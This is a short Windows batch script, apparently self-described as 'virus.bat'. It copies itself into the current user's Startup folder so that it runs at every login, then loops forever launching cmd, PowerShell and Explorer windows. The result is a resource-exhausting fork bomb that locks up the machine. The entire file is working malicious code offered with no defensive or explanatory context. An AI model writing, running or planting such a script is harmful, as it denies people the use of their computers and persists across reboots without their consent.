@echo off
echo %username%
move "C:\Users\Leandro\Downloads\virus.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
:a
start cmd
start powershell
start explorer
goto a